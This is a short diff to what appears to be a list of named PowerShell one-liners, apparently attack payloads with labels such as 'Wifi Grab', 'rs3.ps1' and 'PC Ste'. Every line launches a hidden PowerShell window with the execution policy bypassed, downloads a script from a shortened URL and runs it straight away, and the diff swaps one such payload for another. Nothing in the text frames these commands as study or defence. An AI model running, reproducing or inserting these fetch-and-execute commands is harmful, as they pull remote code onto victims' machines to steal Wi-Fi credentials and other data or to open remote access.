@@ -1,4 +1,4 @@
-PC Ste powershell -w h -NoP -Ep Bypass; irm https://rb.gy/sz67pn | iex > $null 2>&1;exit;
+rs3.ps1 powershell -w h -NoP -Ep Bypass; irm https://rb.gy/67y5f3 | iex 
 Wifi Grab powershell -w h -NoP -Ep Bypass; irm https://rb.gy/bk5rpv | iex
 dcplus powershell -w h -NoP -Ep Bypass; irm https://rb.gy/40f010 | iex
 #Este es
